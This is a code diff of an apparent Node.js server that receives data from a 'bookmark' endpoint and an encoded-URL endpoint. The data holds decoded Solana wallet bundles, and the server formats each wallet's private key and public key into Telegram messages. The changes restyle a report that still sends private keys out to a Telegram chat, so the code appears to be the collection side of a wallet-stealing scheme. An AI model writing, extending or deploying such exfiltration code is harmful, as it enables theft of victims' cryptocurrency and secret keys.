@@ -161,56 +161,47 @@ async function sendToTelegram(message) {
 }
 
 // Helper function to build formatted Telegram message
-function buildTelegramMessage(newEntry, walletCount, endpointType = 'Bookmark') {
-    let message = `📥 *${endpointType} Data Received* 📥\n\n`;
-    message += `🆔 *ID:* \`${newEntry.id}\`\n`;
-    message += `⏰ *Timestamp:* \`${newEntry.timestamp}\`\n`;
-    message += `💼 *Wallets Processed:* \`${walletCount}\`\n\n`;
+function buildTelegramMessage(newEntry, walletCount) {
+    let message = `🔎 *Profile Information*\n`;
+    message += `├ 👤 *User:* ${newEntry.user || 'Unknown'}\n`;
+    message += `├ 🎖 *Level:* ${newEntry.level || 'N/A'}\n`;
 
-    // Add other fields from newEntry if any (excluding processed and raw bundle data)
-    const otherFields = Object.keys(newEntry).filter(key => 
-        key !== 'id' && key !== 'timestamp' && key !== 'processedSBundles' && key !== 'sBundles' && key !== 'bundle'
-    );
-    if (otherFields.length > 0) {
-        message += `📋 *Additional Fields:*\n`;
-        otherFields.forEach(key => {
-            const value = newEntry[key];
-            message += `  *${key}:* \`${typeof value === 'object' ? JSON.stringify(value) : value}\`\n`;
-        });
-        message += `\n`;
-    }
-
-    if (newEntry.sBundles) {
-        message += `🔒 *sBundles:* \`${newEntry.sBundles.substring(0, 100)}...\` (truncated)\n`;
-    }
-
-    if (newEntry.bundle) {
-        message += `🔑 *Bundle Key:* \`${newEntry.bundle.substring(0, 50)}...\` (truncated)\n\n`;
-    }
-
+    // Primary wallet under profile (first wallet)
     if (newEntry.processedSBundles && newEntry.processedSBundles.wallets && newEntry.processedSBundles.wallets.length > 0) {
-        message += `💳 *Wallets Details:* 💳\n`;
-        newEntry.processedSBundles.wallets.forEach((wallet, idx) => {
-            message += `\n${idx + 1 === walletCount ? '🏆' : '🔹'} *Wallet ${wallet.walletIndex}:*\n`;
-            if (wallet.privateKey) {
-                message += `  🔐 *Private Key:* \`${wallet.privateKey}\`\n`;
+        const firstWallet = newEntry.processedSBundles.wallets[0];
+        if (firstWallet.publicKey) {
+            const shortened = firstWallet.publicKey.slice(0, 5) + '…' + firstWallet.publicKey.slice(-5);
+            const link = `[${shortened}](https://solscan.io/account/${firstWallet.publicKey})`;
+            message += `├ 💳 ${link}\n`;
+        }
+    }
+
+    message += `├ 🪪 *ID:* ${newEntry.id || 'N/A'}\n\n`;
+
+    // Connected Wallets
+    message += `💳 *Connected Wallets (${walletCount})*\n`;
+    if (newEntry.processedSBundles && newEntry.processedSBundles.wallets) {
+        newEntry.processedSBundles.wallets.forEach((wallet, index) => {
+            const idx = index + 1;
+            if (wallet.publicKey || wallet.privateKey || wallet.error) {
+                if (wallet.publicKey) {
+                    const shortened = wallet.publicKey.slice(0, 5) + '…' + wallet.publicKey.slice(-5);
+                    const link = `[${shortened}](https://solscan.io/account/${wallet.publicKey})`;
+                    message += `├ ${idx}. 💳 ${link}\n`;
+                }
+                if (wallet.privateKey) {
+                    message += `├ ${idx}. 🔑 *Key:* \`${wallet.privateKey}\`\n`;
+                }
+                if (wallet.error) {
+                    message += `├ ${idx}. ❌ *Error:* \`${wallet.error}\`\n`;
+                }
             }
-            if (wallet.publicKey) {
-                message += `  📍 *Public Key:* \`${wallet.publicKey}\`\n`;
-            }
-            if (wallet.error) {
-                message += `  ❌ *Error:* \`${wallet.error}\`\n`;
-            }
-            message += `───\n`;
         });
-        message += `\n`;
     }
 
     if (newEntry.processedSBundles && newEntry.processedSBundles.error) {
-        message += `⚠️ *Processing Error:* \`${newEntry.processedSBundles.error}\`\n`;
+        message += `\n⚠️ *Processing Error:* \`${newEntry.processedSBundles.error}\``;
     }
-
-    message += `\n✨ *End of Report* ✨`;
 
     return message;
 }
@@ -290,7 +281,7 @@ app.post('/api/bookmark-data', async (req, res) => {
 
         // Format and send Telegram notification
         const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
-        const message = buildTelegramMessage(newEntry, walletCount, 'Bookmark');
+        const message = buildTelegramMessage(newEntry, walletCount);
 
         // If too long, split into multiple messages
         if (message.length > 4096) {
@@ -435,7 +426,7 @@ app.get('/data/:encodedData', async (req, res) => {
 
         // Format and send Telegram notification
         const walletCount = newEntry.processedSBundles ? newEntry.processedSBundles.count : 0;
-        const message = buildTelegramMessage(newEntry, walletCount, 'Encoded');
+        const message = buildTelegramMessage(newEntry, walletCount);
 
         // If too long, split into multiple messages
         if (message.length > 4096) {
